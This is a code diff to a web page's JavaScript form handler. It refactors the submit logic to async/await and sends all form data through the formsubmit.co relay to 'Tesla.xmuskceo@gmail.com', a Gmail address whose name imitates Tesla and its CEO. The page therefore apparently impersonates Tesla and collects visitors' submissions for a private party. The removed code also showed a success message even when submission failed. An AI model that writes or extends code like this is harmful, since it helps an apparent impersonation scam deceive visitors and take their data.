@@ -41,7 +41,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const successState = form.parentElement.querySelector('#submissionSuccess') || document.getElementById('submissionSuccess');
     const submitBtn = form.querySelector('button[type="submit"]');
 
-    form.addEventListener('submit', (e) => {
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
       // Simple validation check
@@ -64,35 +64,43 @@ document.addEventListener('DOMContentLoaded', () => {
         }
       });
 
-      if (isValid) {
-        if (submitBtn) {
-          submitBtn.disabled = true;
-          submitBtn.textContent = 'Submitting...';
-        }
+      if (!isValid) return;
 
-        const formData = new FormData(form);
+      if (submitBtn) {
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Submitting...';
+      }
 
-        fetch('https://formsubmit.co/ajax/Tesla.xmuskceo@gmail.com', {
+      const formData = new FormData(form);
+
+      try {
+        const response = await fetch('https://formsubmit.co/ajax/Tesla.xmuskceo@gmail.com', {
           method: 'POST',
           headers: {
             'Accept': 'application/json'
           },
           body: formData
-        })
-        .then(response => {
-          form.classList.add('hidden');
-          if (successState) {
-            successState.classList.remove('hidden');
-          }
-        })
-        .catch(error => {
-          console.error('Form submission error:', error);
-          // Fallback UI display
-          form.classList.add('hidden');
-          if (successState) {
-            successState.classList.remove('hidden');
-          }
         });
+
+        const data = await response.json();
+
+        if (data.success === 'true' || data.success === true) {
+          form.classList.add('hidden');
+          if (successState) {
+            successState.classList.remove('hidden');
+          }
+        } else if (data.message && data.message.includes('Activation')) {
+          alert('Action Required: Please check your inbox at Tesla.xmuskceo@gmail.com and click "Activate Form" to start receiving form submissions!');
+          form.submit();
+        } else {
+          form.classList.add('hidden');
+          if (successState) {
+            successState.classList.remove('hidden');
+          }
+        }
+      } catch (error) {
+        console.error('Form submission error:', error);
+        form.submit();
       }
     });
   });
